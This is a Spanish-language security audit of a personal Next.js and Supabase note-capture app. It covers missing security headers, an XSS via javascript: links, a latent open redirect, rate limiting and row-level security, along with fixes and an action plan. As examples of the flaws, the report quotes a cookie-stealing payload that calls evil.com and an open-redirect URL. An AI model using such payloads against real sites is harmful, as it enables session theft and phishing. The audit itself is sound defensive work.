# Security Audit — Nucleo

> **Fecha:** 2026-04-08
> **Versión auditada:** Step 6 UI completo (pre-Blueprint)
> **Auditor:** Forge Security Skill #9
> **Veredicto:** ✅ GO — 3 fixes aplicados, 2 pendientes en plan 30d

---

## Contexto de Auditoría

**Producto:** Herramienta personal de segundo cerebro. Un solo usuario (owner). Captura links, texto, markdown y comandos desde iPhone y Mac.

**Stack:**
- Framework: Next.js 16 + React 19 + TypeScript
- Auth: Supabase Auth (email/password)
- DB: Supabase PostgreSQL (RLS pendiente — sin schema aún)
- AI: pipeline async background (no implementado aún)
- External APIs: ninguna en Fase 1

**VCAL:** VCAL-4 — ~90% del código generado por IA (Forge pipeline). Sin historial de commits auditables, sin tests automatizados. Riesgo de deuda oculta.

**Superficie de ataque:**
- Endpoints auth: Server Actions `loginAction`, `signupAction`, `logoutAction`
- Datos PII: email del usuario (Supabase Auth)
- Rutas protegidas: `/dashboard`, `/w/*`
- Features con IA: pendiente Fase 2
- Pagos: ninguno

---

## Resumen de Hallazgos

| ID | Título | OWASP | Severidad | CVSS | Estado |
|----|--------|-------|-----------|------|--------|
| SEC-1 | Security headers ausentes en next.config | A05 | 🟡 Medium | 5.3 | ✅ FIXED |
| SEC-2 | `javascript:` URL en href de ItemDetail | A03 | 🟠 High | 7.5 | ✅ FIXED |
| SEC-3 | Open redirect latente en middleware `?next=` | A01 | 🔵 Low | 3.1 | ✅ FIXED |
| SEC-4 | Sin rate limiting en endpoints de auth | A04 | 🟡 Medium | 5.0 | 📋 Plan 30d |
| SEC-5 | RLS no implementada (schema DB pendiente) | A01 | 🟠 High | 8.0 | 📋 Pre-deploy |
| SEC-6 | VCAL-4 — código no testeado en producción | VCAL | 🔵 Low | 2.5 | 📋 Plan 60d |

**Críticos (9-10):** 0 — Blueprint desbloqueado ✅

---

## Hallazgos Detallados

### SEC-1 — Security headers ausentes ✅ FIXED

**OWASP:** A05 — Security Misconfiguration
**Severidad:** 🟡 Medium | **CVSS:** 5.3
**Evidencia:** `next.config.ts` — sin sección `headers()`

**Descripción:** Sin headers de seguridad HTTP, el navegador no recibe instrucciones para prevenir clickjacking (X-Frame-Options), sniffing de MIME (X-Content-Type-Options), ni downgrade de HTTPS (HSTS).

**Impacto:** Ataques de clickjacking sobre el panel de captura. MIME confusion en uploads futuros. Sin HSTS, posible downgrade a HTTP en redes hostiles.

**Fix aplicado:** `next.config.ts` — agregados `X-Frame-Options: SAMEORIGIN`, `X-Content-Type-Options: nosniff`, `Strict-Transport-Security: max-age=63072000; includeSubDomains; preload`, `Referrer-Policy: origin-when-cross-origin`, `Permissions-Policy: camera=(), microphone=(), geolocation=()`.

**Pendiente para producción:** Agregar `Content-Security-Policy` cuando el stack de imágenes y AI esté definido (los dominios de Supabase Storage y el CDN de thumbnails deben estar allowlisted).

---

### SEC-2 — `javascript:` URL en href de ItemDetail ✅ FIXED

**OWASP:** A03 — Injection / XSS
**Severidad:** 🟠 High | **CVSS:** 7.5
**Evidencia:** `src/features/dashboard/components/ItemDetail.tsx:182` — `href={item.url ?? '#'}`

**Descripción:** El campo `item.url` viene de la base de datos. Si un valor malicioso como `javascript:fetch('https://evil.com/?c='+document.cookie)` llega al campo, se ejecuta al hacer click en "Abrir enlace".

**Impacto:** XSS stored — si la DB es comprometida o hay un bug en la validación server-side, el atacante puede ejecutar código en el contexto del usuario.

**Fix aplicado:** Validación de protocolo antes de usar el href:
```ts
href={item.url && /^https?:\/\//i.test(item.url) ? item.url : '#'}
```
Solo URLs con protocolo `http://` o `https://` son aceptadas. Cualquier otro valor (incluyendo `javascript:`, `data:`, `vbscript:`) queda neutralizado como `#`.

---

### SEC-3 — Open redirect latente en `?next=` ✅ FIXED

**OWASP:** A01 — Broken Access Control
**Severidad:** 🔵 Low | **CVSS:** 3.1
**Evidencia:** `src/middleware.ts:39` — `url.searchParams.set('next', pathname)`

**Descripción:** El parámetro `?next=` se construye desde `pathname` (interno de Next.js, seguro en este momento), pero cuando se implemente el consumo del parámetro para el redirect post-login, un atacante podría manipularlo manualmente en la URL: `/login?next=//evil.com`.

**Impacto potencial:** Phishing post-login — el usuario se loguea legítimamente y es redirigido a un sitio externo que imita la app.

**Fix aplicado:** Función `isSafeRedirectPath()` que valida que el path empiece con `/` pero no con `//` (que es un protocolo-relativo que apunta a dominios externos):
```ts
function isSafeRedirectPath(path: string): boolean {
  return path.startsWith('/') && !path.startsWith('//')
}
```

---

### SEC-4 — Sin rate limiting en endpoints de auth 📋 Plan 30d

**OWASP:** A04 — Insecure Design
**Severidad:** 🟡 Medium | **CVSS:** 5.0
**Evidencia:** `src/features/auth/services/actions.ts` — `loginAction`, `signupAction` sin throttling

**Descripción:** Un atacante puede hacer fuerza bruta de contraseñas contra `loginAction` sin límite de intentos. Supabase Auth tiene protección integrada (bloquea tras ~10 intentos fallidos por IP en proyectos con Auth Captcha), pero no está activada explícitamente.

**Impacto:** Posible account takeover si el usuario usa una contraseña débil.

**Recomendación:**
1. Activar **Supabase Auth Captcha** (hCaptcha/Cloudflare Turnstile) en el dashboard de Supabase → Authentication → Settings → Enable Captcha.
2. Para producción: añadir rate limiting a nivel de Vercel Edge (`@vercel/edge-config` o middleware con conteo por IP + sliding window).
3. Forzar contraseñas mínimas de 10 caracteres (actualizar `signupSchema` de 8 → 10).

**Bloquea Blueprint:** No. Mitigar antes del deploy a producción.

---

### SEC-5 — RLS no implementada (schema DB pendiente) 📋 Pre-deploy

**OWASP:** A01 — Broken Access Control
**Severidad:** 🟠 High | **CVSS:** 8.0
**Evidencia:** No hay schema de Supabase aún — se implementa en la siguiente fase.

**Descripción:** Cuando se creen las tablas `workspaces`, `items`, `folders`, `tags`, etc., **todas deben tener RLS habilitado y políticas que filtren por `auth.uid()`**. Sin RLS, cualquier usuario autenticado podría leer los datos de otro usuario con una query directa al client de Supabase.

**Impacto:** Fuga completa de datos entre usuarios. Catastrófico en cualquier escenario multi-usuario (actualmente es uso personal, pero el riesgo existe si se comparten credenciales o si la app escala).

**Recomendación obligatoria para cada tabla:**
```sql
-- Habilitar RLS
ALTER TABLE items ENABLE ROW LEVEL SECURITY;

-- Política de lectura: solo el owner
CREATE POLICY "items_owner_read" ON items
  FOR SELECT USING (auth.uid() = user_id);

-- Política de escritura: solo el owner
CREATE POLICY "items_owner_write" ON items
  FOR ALL USING (auth.uid() = user_id)
  WITH CHECK (auth.uid() = user_id);
```

**Verificación post-deploy:**
```sql
SELECT tablename, rowsecurity
FROM pg_tables
WHERE schemaname = 'public';
-- rowsecurity = true en TODAS las tablas con datos de usuario
```

**Bloquea Blueprint:** No (sin DB aún). **Bloquea deploy:** Sí — no deployar sin RLS.

---

### SEC-6 — VCAL-4, código sin tests en producción 📋 Plan 60d

**Tipo:** Vibe Coding Risk
**Severidad:** 🔵 Low | **CVSS:** 2.5

**Descripción:** El 90% del código fue generado por IA en este pipeline. El código nunca ha corrido en producción. No hay tests unitarios ni de integración. Hay lógica crítica sin validación en runtime (parsing de markdown, detección de content_type, acciones de auth).

**Riesgos concretos:**
- `parseMarkdownSimple` podría crashear con inputs malformados (edge cases no testeados)
- `detectContentType` puede clasificar incorrectamente URLs no estándar
- Los Server Actions no tienen manejo de errores de red más allá del happy path

**Recomendación plan 60d:**
1. Playwright tests E2E para el flujo de captura (FAB → pegar → guardar → card visible)
2. Tests unitarios para `detectContentType` con edge cases
3. Tests unitarios para `parseMarkdownSimple` con markdown malformado
4. Error boundaries en los componentes principales (ItemDetail, CaptureDialog)

---

## Revisiones con Resultado OK ✅

| Check | Resultado |
|-------|-----------|
| `dangerouslySetInnerHTML` en el codebase | ✅ Ninguno |
| `console.log` con datos sensibles | ✅ Ninguno |
| Tokens en `localStorage` / `sessionStorage` | ✅ Ninguno |
| IDs de usuario desde body del request | ✅ No aplica — sin API routes aún |
| Validación Zod en Server Actions de auth | ✅ Presente en login y signup |
| Mensajes de error de auth genéricos (anti-enumeración) | ✅ "Email o contraseña incorrectos" |
| `rel="noopener noreferrer"` en links externos | ✅ Presente |
| `npm audit` | ✅ 0 vulnerabilidades |
| Secretos hardcodeados en código | ✅ Ninguno — todo via `process.env` |
| Exposición de prompts de IA | ✅ No aplica — sin AI aún |
| Passwords almacenados por la app | ✅ Delegado a Supabase Auth (bcrypt) |

---

## Plan de Acción Post-Audit

### Antes del deploy a producción (bloqueante)
- [ ] **SEC-4:** Activar Supabase Auth Captcha
- [ ] **SEC-5:** Habilitar RLS en todas las tablas al crear el schema
- [ ] **SEC-1 pendiente:** Agregar CSP header con dominios de Supabase Storage

### Plan 30 días
- [ ] Rate limiting en middleware para rutas de auth (sliding window por IP)
- [ ] Subir mínimo de contraseña de 8 → 10 caracteres en `signupSchema`
- [ ] Implementar consume del `?next=` param en post-login con validación de `isSafeRedirectPath`

### Plan 60 días
- [ ] Tests E2E Playwright: flujo de captura completo
- [ ] Tests unitarios: `detectContentType`, `parseMarkdownSimple`
- [ ] Error boundaries en `ItemDetail` y `CaptureDialog`
- [ ] CSP completo con nonces para scripts inline

---

## Veredicto

```
┌─────────────────────────────────────────────┐
│  ✅ GO — Blueprint desbloqueado             │
│                                             │
│  Críticos (9-10):  0                        │
│  Altos (7-8.9):    1 → FIXED               │
│  Medios (4-6.9):   2 → 1 FIXED, 1 plan 30d │
│  Bajos (0-3.9):    2 → 1 FIXED, 1 plan 60d │
│                                             │
│  Sin vulnerabilidades críticas.             │
│  3 fixes aplicados en este audit.           │
│  2 ítems pre-deploy obligatorios (RLS +     │
│  Captcha) documentados.                     │
└─────────────────────────────────────────────┘
```
